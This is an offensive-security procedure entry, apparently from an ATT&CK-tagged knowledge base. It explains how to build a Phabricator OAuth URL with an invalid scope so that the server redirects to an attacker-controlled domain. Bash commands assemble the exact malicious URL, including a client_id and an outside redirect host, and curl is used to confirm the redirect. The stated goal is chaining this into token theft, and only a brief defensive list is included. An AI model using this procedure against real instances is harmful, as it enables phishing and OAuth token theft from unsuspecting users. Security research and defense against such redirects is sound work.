---
id: proc-craft-phab-url-3930
tags:
  - oauth
  - open-redirect
  - phabricator
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:24:35.422Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft Malicious Phabricator OAuth URL

## Summary

This procedure constructs a malicious URL for Phabricator's OAuth endpoint that triggers an open redirect to an attacker-controlled site using an invalid scope parameter.

## Description

The attacker builds a URL targeting /oauthserver/auth/ with parameters including a redirect_uri to their site, response_type=code, a valid client_id, and an invalid scope to exploit the vulnerability. This URL can then be used in chaining attacks. The target environment is any Phabricator instance; outcomes include automatic redirection upon access, enabling token theft when chained.

## Requirements

1. Knowledge of Phabricator client_id (e.g., from public docs)
2. Attacker domain ready to capture redirects
3. URL encoding capability

## Defense

Defensive measures and detection strategies:

- Enforce strict scope validation in OAuth servers
- Block redirects to untrusted domains
- Audit OAuth parameter handling for bypasses

## Objectives

1. Create exploitable Phabricator OAuth URL
2. Ensure invalid scope triggers redirect
3. Validate URL for use in external chaining

## Instructions

### Step 1: Assemble URL Components

**Context**: Combine base endpoint with exploit parameters.

Construct manually or via script:

```bash
URL="https://secure.phabricator.com/oauthserver/auth/?redirect_uri=http://files.nirgoldshlager.com&response_type=code&client_id=PHID-OASC-oyfqtnanxsukiw5lsnce&scope=ggg"
echo $URL
```

> Outputs the full malicious URL. Expected: A string ready for testing or encoding.

### Step 2: Test the Constructed URL

**Context**: Access the URL in a browser to confirm redirection.

Paste into browser or use curl:

```bash
curl -L "$URL" -v
```

> Follows the redirect (-L flag). Expected output: Final location at attacker site.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- oauth
- open-redirect
- phabricator
